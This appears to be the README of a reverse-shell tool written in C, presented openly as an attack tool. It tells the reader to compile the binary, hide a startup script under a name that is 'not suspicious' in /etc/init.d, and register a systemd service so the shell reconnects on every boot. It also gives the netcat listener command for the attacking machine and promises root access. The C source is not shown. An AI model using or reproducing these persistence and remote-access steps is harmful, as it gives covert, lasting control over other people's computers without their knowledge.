# reverse-shell
## DO NOT RUN THIS ON YOUR OWN COMPUTER UNLESS YOU WANT TO BE PWNED
A reverse shell written in c

## Installation and activation
* First, download this in the / directory, compile a binary, then mv foo.exe /
* Second, create a .sh file in /etc/init.d/ and name it something not suspicious. Use foo.sh as example
* Then, in /etc/systemd/system create a .service file (example included). Use foo.service as example
* $systemctl enable foo.service

## On the attacking box
* $nc -nvlp 4444
* When target box reboots or powers on, it will establish connection
* Wait for connection to pop
* Have root

